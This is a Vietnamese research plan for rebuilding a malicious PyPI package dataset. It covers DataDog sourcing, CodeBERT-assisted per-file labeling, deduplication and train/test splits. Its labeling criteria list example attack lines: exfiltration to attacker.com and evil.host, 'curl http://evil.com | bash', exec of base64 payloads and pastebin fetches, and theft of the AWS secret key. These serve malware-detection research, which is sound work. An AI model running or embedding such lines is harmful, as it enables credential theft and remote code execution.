# Kế hoạch Tái thiết D2 Dataset — Phiên bản 3
> **Mục tiêu:** Tái thiết D2 dataset bám sát Ibiyo et al. (2025) và LAMPS (Zeshan et al. 2026)  
> **Ngày cập nhật:** 2026-05-04  
> **Trạng thái:** Ready for execution

---

## 0. Bối cảnh và Quyết định Nguồn Dữ liệu

### Tại sao phải làm lại?

D2 hiện tại (reconstructed v1) có vấn đề cấu trúc nghiêm trọng:
- Gán `label=1` cho **tất cả files** của malicious package, kể cả utility code bình thường (`def add_one(x): return x+1`)
- Filter loại bỏ `setup.py` khiến payload chính bị loại ra ngoài
- Kết quả: chỉ 11/137 packages có payload thực sự được capture → accuracy 72% thay vì 99.5%

### Quyết định nguồn

| Nguồn | Dùng cho | Lý do |
|---|---|---|
| **DataDog** `datadog/malicious-software-packages-dataset` | **PRIMARY — Malicious** | Ibiyo et al. (2025) dùng nguồn này làm D2 gốc. Đây là nguồn bám sát paper nhất. |
| **pypi_malregistry** `lxyeternal/pypi_malregistry` | **SECONDARY — Malicious** | Dùng bổ sung nếu DataDog không đủ số lượng. Đây là nguồn cho D1 (Guo et al. 2023). |
| **PyPI Top Downloads** | **Benign** | Giữ nguyên từ plan v2, đã có ~396 packages. |

> **Lưu ý quan trọng:** DataDog repo có cấu trúc `samples/pypi/compromised_lib/` và `samples/pypi/malicious_intent/` — cả hai đều là malicious, chỉ khác loại tấn công. Lấy cả hai.

### Target Dataset D2

| Thành phần | Target | Nguồn gốc trong paper |
|---|---|---|
| Malicious files | **274** | Từ ~140 malicious packages |
| Benign files | **1,022** | Từ ~367 benign packages |
| Tổng packages | **~507** | — |
| Class ratio | ~1:3.7 (malicious:benign) | Tự nhiên, không balance nhân tạo |

---

## 1. Nguyên tắc Gắn nhãn (Content-Based Labeling)

**Quy tắc cốt lõi:** Label theo **nội dung file**, không theo tên package.

```
label = 1 (MALICIOUS)  →  file chứa code độc hại thực sự
label = 0 (BENIGN)     →  file có nội dung lành mạnh, dù thuộc package độc hại
```

### Tiêu chí label=1 (Malicious)

File được coi là MALICIOUS khi có ít nhất một trong các pattern sau:

```python
# 1. Install hooks với payload
from setuptools.command.install import install
class PostInstall(install):
    def run(self):
        subprocess.Popen(...)  # payload ở đây

# 2. Network exfiltration
requests.post("http://attacker.com/", data=stolen_data)
socket.connect(("evil.host", 4444))

# 3. Obfuscated/encoded execution
exec(base64.b64decode("cABvAHcAZQ..."))
eval(compile(zlib.decompress(b"..."), "", "exec"))

# 4. Hidden subprocess/OS commands
subprocess.Popen("cmd /c ...", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
os.system("curl http://evil.com | bash")

# 5. Credential/env theft
data = os.environ.get("AWS_SECRET_ACCESS_KEY")
requests.post(exfil_url, data=data)  # gửi ra ngoài

# 6. Dynamic remote execution
exec(requests.get("https://pastebin.com/raw/xyz").text)
```

### Tiêu chí label=0 (Benign — dù trong malicious package)

- Utility module thuần túy (helper functions, constants, data classes)
- `__init__.py` rỗng hoặc chỉ re-export
- Code ML/data processing bình thường
- Không có network calls với mục đích exfiltration
- Không có subprocess/eval/exec với input từ bên ngoài

---

## 2. Phase 1 — Thu thập Malicious Files

### 2.1 Nguồn PRIMARY: DataDog

```bash
git clone https://github.com/datadog/malicious-software-packages-dataset.git
cd malicious-software-packages-dataset
ls samples/pypi/
# Expect: compromised_lib/  malicious_intent/  manifest.json
```

**Khám phá cấu trúc:**
```bash
# Đếm packages trong mỗi category
ls samples/pypi/compromised_lib/ | wc -l
ls samples/pypi/malicious_intent/ | wc -l

# Xem format: source code trực tiếp hay archives?
find samples/pypi/ -name "*.py" | head -10
find samples/pypi/ -name "*.tar.gz" -o -name "*.whl" | head -10
```

**Script extract từ DataDog:**
```python
# extract_datadog_d2.py
import os, hashlib, json
from pathlib import Path

DATADOG_PATH = "./malicious-software-packages-dataset/samples/pypi"
OUTPUT_DIR = "./D2_dataset/malicious"
D1_HASHES_FILE = "./d1_content_hashes.json"  # Xem mục 2.3

# Load D1 hashes để dedup
with open(D1_HASHES_FILE) as f:
    d1_hashes = set(json.load(f))

SKIP_DIRS = {'test', 'tests', 'doc', 'docs', 'example', 'examples', '__pycache__'}
SKIP_FILES = {'conftest.py'}

def should_skip(filepath: str, content: str) -> tuple[bool, str]:
    """Trả về (skip: bool, reason: str)"""
    parts = Path(filepath).parts
    name = os.path.basename(filepath)

    # Skip non-python
    if not filepath.endswith('.py'):
        return True, "not .py"

    # Skip test/doc dirs
    if any(p.lower() in SKIP_DIRS for p in parts):
        return True, "test/doc dir"

    # Skip conftest
    if name in SKIP_FILES:
        return True, "conftest"

    # setup.py: chỉ skip nếu trùng D1
    if name == 'setup.py':
        content_hash = hashlib.md5(content.encode('utf-8', errors='ignore')).hexdigest()
        if content_hash in d1_hashes:
            return True, "setup.py duplicate with D1"
        # Không trùng D1 → GIỮ LẠI (setup.py thường chứa payload)

    # Skip file quá nhỏ (< 50 chars — thường là rỗng hoặc chỉ có comment)
    if len(content.strip()) < 50:
        return True, "too short"

    return False, ""


def extract_from_datadog():
    categories = ['compromised_lib', 'malicious_intent']
    all_metadata = []

    for category in categories:
        cat_path = Path(DATADOG_PATH) / category
        if not cat_path.exists():
            print(f"[WARN] Category not found: {cat_path}")
            continue

        for pkg_dir in cat_path.iterdir():
            if not pkg_dir.is_dir():
                continue

            pkg_name = pkg_dir.name
            pkg_files = []

            for py_file in pkg_dir.rglob("*.py"):
                try:
                    content = py_file.read_text(encoding='utf-8', errors='ignore')
                except Exception:
                    continue

                skip, reason = should_skip(str(py_file), content)
                if skip:
                    continue

                file_hash = hashlib.md5(content.encode('utf-8', errors='ignore')).hexdigest()[:8]
                safe_pkg = pkg_name.replace('-', '_').replace('.', '_')[:40]
                filename = f"{safe_pkg}_{len(pkg_files):03d}_{file_hash}.py"

                os.makedirs(OUTPUT_DIR, exist_ok=True)
                out_path = os.path.join(OUTPUT_DIR, filename)
                with open(out_path, 'w', encoding='utf-8', errors='ignore') as f:
                    f.write(content)

                pkg_files.append({
                    "filename": filename,
                    "original_path": str(py_file.relative_to(DATADOG_PATH)),
                    "package": pkg_name,
                    "category": category,
                    "label": "pending",  # Sẽ được gán sau bằng CodeBERT
                    "label_int": -1,
                    "char_count": len(content),
                    "source": "datadog"
                })

            all_metadata.extend(pkg_files)
            print(f"  [{category}] {pkg_name}: {len(pkg_files)} files extracted")

    with open("datadog_extracted_metadata.json", 'w') as f:
        json.dump(all_metadata, f, indent=2)

    print(f"\n=== DATADOG EXTRACTION COMPLETE ===")
    print(f"  Total files extracted: {len(all_metadata)}")
    print(f"  Unique packages: {len(set(m['package'] for m in all_metadata))}")
    return all_metadata


if __name__ == "__main__":
    extract_from_datadog()
```

### 2.2 Nguồn SECONDARY: pypi_malregistry (nếu DataDog không đủ)

Chỉ dùng nếu DataDog cho < 200 packages. Lấy từ 900+ packages chưa dùng, với **cùng logic** như DataDog script trên (bao gồm setup.py nếu không trùng D1).

Ưu tiên packages có `≥ 2 .py files ngoài test/doc` để bảo đảm multi-file structure.

### 2.3 Build D1 Hash Set (dedup)

Chạy script này **trước** khi extract:

```python
# build_d1_hashes.py
import hashlib, json, csv

D1_CSV = "./Dataset/D2-6000snippets.csv"  # File D1 của team
d1_hashes = set()

with open(D1_CSV, encoding='utf-8', errors='ignore') as f:
    reader = csv.DictReader(f)
    for row in reader:
        content = row.get('content', row.get('code', ''))
        if content:
            h = hashlib.md5(content.encode('utf-8', errors='ignore')).hexdigest()
            d1_hashes.add(h)

with open("d1_content_hashes.json", 'w') as f:
    json.dump(list(d1_hashes), f)

print(f"D1 hashes built: {len(d1_hashes)} unique files")
```

---

## 3. Phase 2 — Content-Based Labeling với CodeBERT

### 3.1 Chạy CodeBERT inference trên toàn bộ extracted files

```python
# codebert_label.py
"""
Chạy CodeBERT để lấy malicious probability cho từng file.
Model: KevinPhamH/codebert-finetuned (hoặc checkpoint của team)
"""

import json, os, torch
from transformers import AutoTokenizer, AutoModelForSequenceClassification
import numpy as np

MODEL_NAME = "KevinPhamH/codebert-finetuned"
MALICIOUS_DIR = "./D2_dataset/malicious"
METADATA_FILE = "./datadog_extracted_metadata.json"
OUTPUT_FILE = "./labeled_metadata.json"

tokenizer = AutoTokenizer.from_pretrained(MODEL_NAME)
model = AutoModelForSequenceClassification.from_pretrained(MODEL_NAME)
model.eval()

def get_prob(content: str) -> float:
    """Trả về xác suất malicious (0.0 → 1.0)"""
    inputs = tokenizer(
        content[:2000],  # truncate để tránh OOM
        return_tensors="pt",
        truncation=True,
        max_length=512,
        padding=True
    )
    with torch.no_grad():
        logits = model(**inputs).logits
        probs = torch.softmax(logits, dim=-1)
    # Giả sử class 1 = malicious
    return probs[0][1].item()


def label_files():
    with open(METADATA_FILE) as f:
        metadata = json.load(f)

    results = []
    for i, item in enumerate(metadata):
        filepath = os.path.join(MALICIOUS_DIR, item['filename'])
        try:
            with open(filepath, encoding='utf-8', errors='ignore') as f:
                content = f.read()
        except Exception as e:
            print(f"[ERROR] {item['filename']}: {e}")
            continue

        prob = get_prob(content)

        # Gán label tự động theo threshold
        if prob >= 0.90:
            label_int = 1
            label = "malicious"
            confidence = "high"
        elif prob <= 0.10:
            label_int = 0
            label = "benign"
            confidence = "high"
        else:
            label_int = -1      # Cần manual review
            label = "review"
            confidence = "low"

        item.update({
            "malicious_prob": round(prob, 4),
            "label_int": label_int,
            "label": label,
            "confidence": confidence
        })
        results.append(item)

        if (i + 1) % 50 == 0:
            print(f"  [{i+1}/{len(metadata)}] Processed...")

    with open(OUTPUT_FILE, 'w') as f:
        json.dump(results, f, indent=2)

    # Summary
    high_mal = sum(1 for r in results if r['label_int'] == 1)
    high_ben = sum(1 for r in results if r['label_int'] == 0)
    review = sum(1 for r in results if r['label_int'] == -1)

    print(f"\n=== LABELING SUMMARY ===")
    print(f"  Auto-labeled MALICIOUS (prob ≥ 0.90): {high_mal}")
    print(f"  Auto-labeled BENIGN    (prob ≤ 0.10): {high_ben}")
    print(f"  Needs manual review    (0.10-0.90):   {review}")

    return results


if __name__ == "__main__":
    label_files()
```

### 3.2 Manual Review (files có prob 0.10–0.90)

Đọc từng file, áp dụng tiêu chí ở mục 1. Câu hỏi quyết định:

> *"Nếu user cài package này, file này có thực sự gây hại không?"*

Ghi kết quả vào `labeled_metadata.json` — đổi `label_int` thành 0 hoặc 1, `confidence` thành `"manual"`.

### 3.3 Package-Level Consistency Check

```python
# consistency_check.py
"""
Sau khi label xong: kiểm tra mỗi malicious package có ít nhất 1 file label=1.
Các package không có file nào label=1 → loại khỏi malicious set.
"""
import json
from collections import defaultdict

with open("labeled_metadata.json") as f:
    metadata = json.load(f)

# Group by package
packages = defaultdict(list)
for item in metadata:
    packages[item['package']].append(item)

valid_packages = []
dropped_packages = []

for pkg_name, files in packages.items():
    has_malicious = any(f['label_int'] == 1 for f in files)
    if has_malicious:
        valid_packages.append(pkg_name)
    else:
        dropped_packages.append(pkg_name)

print(f"Valid malicious packages (≥1 malicious file): {len(valid_packages)}")
print(f"Dropped packages (no malicious file found):   {len(dropped_packages)}")

# Chỉ giữ files từ valid packages
final_metadata = [
    item for item in metadata
    if item['package'] in set(valid_packages) and item['label_int'] != -1
]

with open("final_malicious_metadata.json", 'w') as f:
    json.dump(final_metadata, f, indent=2)

print(f"Final malicious files: {sum(1 for f in final_metadata if f['label_int'] == 1)}")
print(f"Dropped files (from invalid packages): {len(metadata) - len(final_metadata)}")
```

---

## 4. Phase 3 — Benign Files

Phần này **giữ nguyên** từ plan v2. Team đã có ~396 packages × ~2.5 files = ~990 files.

Nếu cần bổ sung để đạt 1,022:
```bash
# Lấy thêm từ top PyPI downloads, chưa có trong benign set
pip download --no-deps <package_name> -d ./tmp_benign/
```

Áp dụng `quick_scan()` để filter các file benign có suspicious patterns (false positive check).

---

## 5. Phase 4 — Assemble Final D2

```python
# build_final_d2.py
import json, os, shutil, random
from collections import defaultdict

MALICIOUS_METADATA = "./final_malicious_metadata.json"
BENIGN_METADATA = "./benign_metadata_final.json"
OUTPUT_DIR = "./D2_final"
SEEDS = [42, 123, 456, 789, 1024]

with open(MALICIOUS_METADATA) as f:
    malicious = json.load(f)
with open(BENIGN_METADATA) as f:
    benign = json.load(f)

# Chỉ lấy files đã được label rõ ràng
malicious_files = [f for f in malicious if f['label_int'] == 1]
benign_files    = [f for f in benign    if f['label_int'] == 0]

print(f"Malicious files: {len(malicious_files)}")
print(f"Benign files:    {len(benign_files)}")
print(f"Ratio: 1:{len(benign_files)/len(malicious_files):.1f}")

# Summary stats
mal_pkgs = set(f['package'] for f in malicious_files)
ben_pkgs = set(f['package'] for f in benign_files)
print(f"Malicious packages: {len(mal_pkgs)}")
print(f"Benign packages:    {len(ben_pkgs)}")

# Build package-level splits (5 seeds)
all_packages = list(mal_pkgs) + list(ben_pkgs)
pkg_labels = {p: 1 for p in mal_pkgs}
pkg_labels.update({p: 0 for p in ben_pkgs})

splits = {}
for seed in SEEDS:
    random.seed(seed)
    shuffled = all_packages.copy()
    random.shuffle(shuffled)
    n_test = int(len(shuffled) * 0.2)
    splits[seed] = {
        "train": shuffled[n_test:],
        "test": shuffled[:n_test]
    }

with open(os.path.join(OUTPUT_DIR, "splits.json"), 'w') as f:
    json.dump(splits, f, indent=2)

# Write final metadata
all_files = malicious_files + benign_files
with open(os.path.join(OUTPUT_DIR, "metadata.json"), 'w') as f:
    json.dump(all_files, f, indent=2)

print(f"\n=== D2 FINAL BUILD COMPLETE ===")
print(f"  Total files: {len(all_files)}")
print(f"  Splits saved for seeds: {SEEDS}")
```

---

## 6. Target Kiểm tra Cuối

Trước khi dùng D2 để evaluate, verify các điều kiện sau:

```
[ ] Malicious files: ~274 (chấp nhận 250–300)
[ ] Benign files: ~1,022 (chấp nhận 950–1,100)
[ ] Malicious packages: ~140 (chấp nhận 120–160)
[ ] Benign packages: ~367 (chấp nhận 340–400)
[ ] Class ratio: 1:3.5 đến 1:4.0
[ ] Mỗi malicious package có ít nhất 1 file label=1
[ ] Không có file nào label=-1 (pending review) trong final set
[ ] Spot-check thủ công: 20 malicious + 20 benign files
[ ] Dedup với D1: không có file nào trong D2 trùng hash với D1
```

---

## 7. Workflow Thực hiện (Thứ tự)

```
BƯỚC 1 — Build D1 hash set                     (15 phút)
  python build_d1_hashes.py

BƯỚC 2 — Explore DataDog structure              (30 phút)
  git clone https://github.com/datadog/malicious-software-packages-dataset.git
  ls samples/pypi/compromised_lib/ | wc -l
  ls samples/pypi/malicious_intent/ | wc -l

BƯỚC 3 — Extract từ DataDog                     (1-2 giờ)
  python extract_datadog_d2.py
  → Output: datadog_extracted_metadata.json

BƯỚC 4A — Nếu DataDog cho < 200 packages:
  Supplement với pypi_malregistry (900+ packages chưa dùng)
  Dùng cùng extract logic, kết hợp output vào metadata chung

BƯỚC 5 — CodeBERT auto-labeling                 (30 phút - 1 giờ)
  python codebert_label.py
  → Output: labeled_metadata.json (prob + auto-label)

BƯỚC 6 — Manual review                          (2-4 giờ, tùy số lượng)
  Mở labeled_metadata.json, filter label_int == -1
  Review từng file, gán 0 hoặc 1

BƯỚC 7 — Consistency check                      (15 phút)
  python consistency_check.py
  → Output: final_malicious_metadata.json

BƯỚC 8 — Assemble final D2                      (30 phút)
  python build_final_d2.py
  → Output: D2_final/metadata.json + splits.json

BƯỚC 9 — Run evaluation                         (tuỳ)
  Chạy lại LAMPS pipeline trên D2 mới
```

---

## 8. Ghi chú Kỹ thuật

### Tại sao giữ lại setup.py (khác với plan v2)?

Plan v2 loại setup.py để tránh overlap với D1. Điều này sai vì:
- D1 overlap check phải dùng **content hash**, không phải filename
- Nhiều malicious packages nhúng payload **chính trong setup.py**
- Kết quả: plan v2 loại bỏ phần lớn payload files → 11/137 packages được detect

Plan v3 giữ lại setup.py và dedup bằng hash — chính xác hơn, không bỏ sót payload.

### Tại sao dùng DataDog thay pypi_malregistry làm primary?

- Ibiyo et al. (2025) — paper được LAMPS cite làm nguồn D2 gốc — dùng DataDog
- pypi_malregistry (Guo et al. 2023) là nguồn cho **D1** trong LAMPS
- Dùng đúng nguồn → replication trung thực hơn, kết quả so sánh công bằng hơn

### Về CodeBERT labeling threshold

Threshold 0.90/0.10 được chọn conservative để:
- Giảm manual review effort (chỉ review ~10-20% files)
- Đảm bảo high-confidence auto-labels không bị sai
- Điều chỉnh nếu số lượng "review" quá nhiều (>30% → hạ threshold xuống 0.80/0.20)

---

*Plan v3 — Tác giả: Team. Cập nhật sau khi xác nhận DataDog có PyPI samples và phân tích root cause của D2 reconstruction failure.*
